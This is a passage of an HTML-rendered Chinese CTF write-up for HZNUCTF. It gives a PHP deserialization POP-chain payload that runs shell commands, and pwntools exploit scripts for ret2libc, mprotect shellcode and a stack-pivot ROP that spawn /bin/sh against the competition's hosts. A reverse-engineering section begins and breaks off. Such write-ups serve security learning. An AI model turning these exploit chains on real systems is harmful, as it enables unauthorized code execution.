+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">public</span> <span class="n">function</span> <span class="n">__destruct</span><span class="p">(){</span>
+</span></span><span class="line"><span class="cl">            <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">no</span> <span class="o">=</span> <span class="s2">&#34;no&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="o">$</span><span class="n">this</span><span class="o">-&gt;</span><span class="n">no</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">file_exists</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">])){</span>
+</span></span><span class="line"><span class="cl">        <span class="n">echo</span> <span class="s2">&#34;Focus on the previous step!&lt;br&gt;&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="o">$</span><span class="n">data</span><span class="o">=</span><span class="n">substr</span><span class="p">(</span><span class="o">$</span><span class="n">_GET</span><span class="p">[</span><span class="s1">&#39;filename&#39;</span><span class="p">],</span><span class="mi">0</span><span class="p">,</span><span class="o">-</span><span class="mi">4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">unserialize</span><span class="p">(</span><span class="n">best64_decode</span><span class="p">(</span><span class="o">$</span><span class="n">data</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="o">//</span> <span class="n">You</span> <span class="n">learn</span> <span class="n">yesterday</span><span class="p">,</span> <span class="n">you</span> <span class="n">choose</span> <span class="n">today</span><span class="p">,</span> <span class="n">can</span> <span class="n">you</span> <span class="n">get</span> <span class="n">to</span> <span class="n">your</span> <span class="n">future</span><span class="err">?</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span> 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>要解决这道题，需要构造一个反序列化链，触发future类的__toString方法以执行任意命令。</p>
+<p>步骤解析</p>
+<ul>
+<li>
+<p>1.触发析构函数：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  当yesterday对象被销毁时，其__destruct方法会调用$this-&gt;study-&gt;hard()。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  将yesterday的study属性设为today对象，触发today的__call方法。
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>2.调用魔术方法：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  today的__call方法在调用不存在的方法（如hard）时触发。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  此时会检查$this-&gt;doing的两次MD5哈希是否等于666。
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+<li>
+<p>3.绕过条件检查：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">  即使条件不满足，只要$this-&gt;doing是future对象，在计算MD5时会将其转换为字符串，触发__toString方法。
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  future的__toString执行system($_POST[&#39;wow&#39;])，直接执行任意命令。
+</span></span></code></pre></td></tr></table>
+</div>
+</div></li>
+</ul>
+<p>Payload 生成代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="o">&lt;</span><span class="err">?</span><span class="n">php</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">yesterday</span> <span class="p">{</span> <span class="n">public</span> <span class="o">$</span><span class="n">study</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">today</span> <span class="p">{</span> <span class="n">public</span> <span class="o">$</span><span class="n">doing</span><span class="p">;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="n">future</span> <span class="p">{}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">future</span> <span class="o">=</span> <span class="n">new</span> <span class="n">future</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">today</span> <span class="o">=</span> <span class="n">new</span> <span class="n">today</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">today</span><span class="o">-&gt;</span><span class="n">doing</span> <span class="o">=</span> <span class="o">$</span><span class="n">future</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">yesterday</span> <span class="o">=</span> <span class="n">new</span> <span class="n">yesterday</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">yesterday</span><span class="o">-&gt;</span><span class="n">study</span> <span class="o">=</span> <span class="o">$</span><span class="n">today</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">$</span><span class="n">payload</span> <span class="o">=</span> <span class="n">serialize</span><span class="p">(</span><span class="o">$</span><span class="n">yesterday</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="p">(</span><span class="o">$</span><span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="o">$</span><span class="n">i</span> <span class="o">&lt;</span> <span class="mi">5</span><span class="p">;</span> <span class="o">$</span><span class="n">i</span><span class="o">++</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="o">$</span><span class="n">payload</span> <span class="o">=</span> <span class="n">base64_encode</span><span class="p">(</span><span class="o">$</span><span class="n">payload</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="o">$</span><span class="n">payload</span> <span class="o">.</span> <span class="s1">&#39;.txt&#39;</span><span class="p">;</span> <span class="o">//</span> <span class="err">触发反序列化</span>
+</span></span><span class="line"><span class="cl"><span class="err">?</span><span class="o">&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>GET方式传Payload,POST方式传递命令<code>wow=cat /flag</code></p>
+<p>得到flag</p>
+<hr>
+<h1 id="pwn">PWN
+</h1><ul>
+<li>签到</li>
+</ul>
+<p>保护只开了NX，ret2libc</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">c</span>
+</span></span><span class="line"><span class="cl"><span class="ne">int</span> <span class="n">__fastcall</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">char</span> <span class="n">v4</span><span class="p">[</span><span class="mi">112</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">0</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">70</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">_bss_start</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">setbuf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="mi">0</span><span class="n">LL</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">puts</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;As a student who has been learning pwn for half a year</span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;basic ROP is an essential skill that everyone should master. </span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Therefore, hurry up and complete the check-in. </span><span class="se">\n</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">    <span class="s2">&#34;Welcome to the Hangzhou Normal University CTF competition, please leave your name.&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">gets</span><span class="p">(</span><span class="n">v4</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先泄露puts地址得到基址再调用system</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">from pwn import*
+</span></span><span class="line"><span class="cl">#p=process(&#34;./pwn&#34;)
+</span></span><span class="line"><span class="cl">p=remote(&#34;node1.tgctf.woooo.tech&#34;,30372)
+</span></span><span class="line"><span class="cl">elf=ELF(&#34;./pwn&#34;)
+</span></span><span class="line"><span class="cl">libc=ELF(&#34;./libc.so.6&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">puts_plt=elf.plt[&#34;puts&#34;]
+</span></span><span class="line"><span class="cl">puts_got=elf.got[&#34;puts&#34;]
+</span></span><span class="line"><span class="cl">pop_rdi_ret=0x401176
+</span></span><span class="line"><span class="cl">ret=0x40101a
+</span></span><span class="line"><span class="cl">main=0x401178
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p.recvuntil(b&#34;name.&#34;)
+</span></span><span class="line"><span class="cl">pl1=b&#39;a&#39;*0x78+p64(pop_rdi_ret)+p64(puts_got)+p64(puts_plt)+p64(main)       #0x70
+</span></span><span class="line"><span class="cl">p.sendline(pl1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">puts_addr=u64(p.recvuntil(b&#39;\x7f&#39;)[-6:].ljust(8,b&#39;\x00&#39;))
+</span></span><span class="line"><span class="cl">print(hex(puts_addr))  #0x7fe6ca5e2e50
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">libcbase=puts_addr-libc.symbols[&#34;puts&#34;]
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">print(hex(libcbase))  #0x7fe6ca562000
+</span></span><span class="line"><span class="cl">system=libcbase+libc.symbols[&#34;system&#34;]
+</span></span><span class="line"><span class="cl">binsh=libcbase+next(libc.search(b&#34;/bin/sh&#34;))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pl2=b&#39;a&#39;*0x78+p64(ret)+p64(pop_rdi_ret)+p64(binsh)+p64(system)
+</span></span><span class="line"><span class="cl">#pl2=b&#39;a&#39;*0x78+p64(pop_rdi_ret)+p64(binsh)+p64(system)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p.sendline(pl2)
+</span></span><span class="line"><span class="cl">p.interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>shellcode</li>
+</ul>
+<p>pl1:</p>
+<p>(调用mprotect修改权限，再调用)
+mov dl,7
+mov sil,0xff
+mov al,0xa
+syscall
+（调用read，将要向缓冲区读取shellcode）
+xor edi,edi
+xor edx,esi
+xchg rsi,rcx
+syscall</p>
+<p>pl2:</p>
+<p>nop*0x10</p>
+<p>add rsi,0x20f
+mov rsp,rsi</p>
+<p>shellcode</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">#p=process(&#39;./pwn&#39;)
+</span></span><span class="line"><span class="cl">context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,os=&#39;linux&#39;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p=remote(&#34;node2.tgctf.woooo.tech&#34;,32130)
+</span></span><span class="line"><span class="cl">#shellcode=&#34;\x99\x48\xBF\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x48\x89\xE7\xB0\x3B\x0F\x05&#34;
+</span></span><span class="line"><span class="cl">#shellcode=&#34;\x48\x87\xFC\xBF\x73\x68\x00\x00\x57\x54\x5F\xB0\x3B\x0F\x05&#34;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pl1=&#34;\xB2\x07\x40\xB6\xFF\xB0\x0A\x0F\x05\x31\xFF\x31\xF2\x48\x87\xCE\x0F\x05&#34;
+</span></span><span class="line"><span class="cl">p.send(pl1)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pause()
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pl2=b&#34;\x90&#34;*0x10+b&#34;\x48\x81\xC6\x0F\x02\x00\x00\x48\x89\xF4&#34;+asm(shellcraft.sh())
+</span></span><span class="line"><span class="cl">p.send(pl2)
+</span></span><span class="line"><span class="cl">p.interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><ul>
+<li>overflow</li>
+</ul>
+<p>题目在ret之前通过<code>lea     esp, [ebp-8]</code>  <code>pop     ecx</code>  <code>lea     esp, [ecx-4]</code>调整了栈帧，因此我们通过溢出将rsp控制到bss段，在bss段写入rop</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">python
+</span></span><span class="line"><span class="cl">from pwn import *
+</span></span><span class="line"><span class="cl">context(log_level=&#39;debug&#39;,os=&#39;linux&#39;)
+</span></span><span class="line"><span class="cl">p=process(&#34;./pwn&#34;)
+</span></span><span class="line"><span class="cl">#p=remote(&#34;node1.tgctf.woooo.tech&#34;,31248)
+</span></span><span class="line"><span class="cl">eax_add=0x80b470a
+</span></span><span class="line"><span class="cl">ebx_add=0x08049022
+</span></span><span class="line"><span class="cl">ecx_add=0x08049802
+</span></span><span class="line"><span class="cl">edx_add=0x08060bd1
+</span></span><span class="line"><span class="cl">int80=0x08049c6a
+</span></span><span class="line"><span class="cl">name=0x080EF320
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">gdb.attach(p)
+</span></span><span class="line"><span class="cl">pause()
+</span></span><span class="line"><span class="cl">p.recvuntil(b&#34;me?&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p.send(b&#34;/bin/sh\x00&#34;+b&#39;a&#39;*8+p32(ebx_add)+p32(name)+p32(ecx_add)+p32(0)+p32(edx_add)+p32(0)+p32(eax_add)+p32(0xb)+p32(int80))
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">p.recvuntil(&#34;right?&#34;)
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">pl=b&#39;a&#39;*200+p32(0x080EF334)
+</span></span><span class="line"><span class="cl">p.sendline(pl)
+</span></span><span class="line"><span class="cl">p.interactive()
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="reverse">Reverse
+</h1><p>deepseek用得好，逆向工程难不倒（bushi）</p>
+<hr>
+<h2 id="base64">Base64
+</h2><p>题目提示是base64算法，进IDA看看伪C</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">c</span>
+</span></span><span class="line"><span class="cl"><span class="n">nt</span> <span class="n">__fastcall</span> <span class="n">main</span><span class="p">(</span><span class="ne">int</span> <span class="n">argc</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">,</span> <span class="k">const</span> <span class="n">char</span> <span class="o">**</span><span class="n">envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="n">char</span> <span class="o">*</span><span class="n">v3</span><span class="p">;</span> <span class="o">//</span> <span class="n">rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="n">__int64</span> <span class="n">v4</span><span class="p">;</span> <span class="o">//</span> <span class="n">rcx</span>
+</span></span><span class="line"><span class="cl">  <span class="n">void</span> <span class="o">*</span><span class="n">v5</span><span class="p">;</span> <span class="o">//</span> <span class="n">rbx</span>
+</span></span><span class="line"><span class="cl">  <span class="n">char</span> <span class="n">Destination</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span> <span class="o">//</span> <span class="p">[</span><span class="n">rsp</span><span class="o">+</span><span class="mi">20</span><span class="n">h</span><span class="p">]</span> <span class="p">[</span><span class="n">rbp</span><span class="o">-</span><span class="mi">28</span><span class="n">h</span><span class="p">]</span> <span class="n">BYREF</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">  <span class="n">sub_140001020</span><span class="p">(</span><span class="s2">&#34;Welcome to HZNUCTF!!!</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sub_140001020</span><span class="p">(</span><span class="s2">&#34;Plz input your flag:</span><span class="se">\n</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v3</span> <span class="o">=</span> <span class="p">(</span><span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="s1">&#39;*&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sub_140001080</span><span class="p">(</span><span class="s2">&#34;</span><span class="si">%s</span><span class="s2">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">v4</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="n">i64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">do</span>
+</span></span><span class="line"><span class="cl">    <span class="o">++</span><span class="n">v4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="k">while</span> <span class="p">(</span> <span class="n">v3</span><span class="p">[</span><span class="n">v4</span><span class="p">]</span> <span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">v4</span> <span class="o">==</span> <span class="mi">41</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">  <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">strncpy_s</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="mi">9</span><span class="n">ui64</span><span class="p">,</span> <span class="n">v3</span><span class="p">,</span> <span class="mi">8</span><span class="n">ui64</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">Destination</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">(</span><span class="n">Destination</span><span class="p">,</span> <span class="s2">&#34;HZNUCTF{&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="p">{</span>
+</span></span><span class="line"><span class="cl">      <span class="n">v5</span> <span class="o">=</span> <span class="p">(</span><span class="n">void</span> <span class="o">*</span><span class="p">)</span><span class="n">sub_1400010E0</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">strcmp</span><span class="p">((</span><span class="k">const</span> <span class="n">char</span> <span class="o">*</span><span class="p">)</span><span class="n">v5</span><span class="p">,</span> <span class="s2">&#34;AwLdOEVEhIWtajB2CbCWCbTRVsFFC8hirfiXC9gWH9HQayCJVbB8CIF=&#34;</span><span class="p">)</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">      <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sub_140001020</span><span class="p">(</span><span class="s2">&#34;Congratulation!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">free</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="p">}</span>
+</span></span><span class="line"><span class="cl">      <span class="n">sub_140001020</span><span class="p">(</span><span class="s2">&#34;wrong_wrong!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">free</span><span class="p">(</span><span class="n">v5</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">      <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="n">sub_140001020</span><span class="p">(</span><span class="s2">&#34;wrong head!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">free</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="p">}</span>
+</span></span><span class="line"><span class="cl">  <span class="n">sub_140001020</span><span class="p">(</span><span class="s2">&#34;wrong len!!!&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="n">free</span><span class="p">(</span><span class="n">v3</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>进sub_1400010E0看看</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">  1
+</span><span class="lnt">  2
+</span><span class="lnt">  3
+</span><span class="lnt">  4
+</span><span class="lnt">  5
+</span><span class="lnt">  6
+</span><span class="lnt">  7
+</span><span class="lnt">  8
+</span><span class="lnt">  9
+</span><span class="lnt"> 10
+</span><span class="lnt"> 11
+</span><span class="lnt"> 12
+</span><span class="lnt"> 13
+</span><span class="lnt"> 14
+</span><span class="lnt"> 15
+</span><span class="lnt"> 16
+</span><span class="lnt"> 17
+</span><span class="lnt"> 18
+</span><span class="lnt"> 19
+</span><span class="lnt"> 20
+</span><span class="lnt"> 21
+</span><span class="lnt"> 22
+</span><span class="lnt"> 23
+</span><span class="lnt"> 24
+</span><span class="lnt"> 25
+</span><span class="lnt"> 26
+</span><span class="lnt"> 27
+</span><span class="lnt"> 28
+</span><span class="lnt"> 29
+</span><span class="lnt"> 30
+</span><span class="lnt"> 31
+</span><span class="lnt"> 32
+</span><span class="lnt"> 33
+</span><span class="lnt"> 34
+</span><span class="lnt"> 35
+</span><span class="lnt"> 36
+</span><span class="lnt"> 37
+</span><span class="lnt"> 38
+</span><span class="lnt"> 39
+</span><span class="lnt"> 40
+</span><span class="lnt"> 41
+</span><span class="lnt"> 42
+</span><span class="lnt"> 43
+</span><span class="lnt"> 44
+</span><span class="lnt"> 45
+</span><span class="lnt"> 46
+</span><span class="lnt"> 47
+</span><span class="lnt"> 48
+</span><span class="lnt"> 49
+</span><span class="lnt"> 50
+</span><span class="lnt"> 51
+</span><span class="lnt"> 52
+</span><span class="lnt"> 53
+</span><span class="lnt"> 54
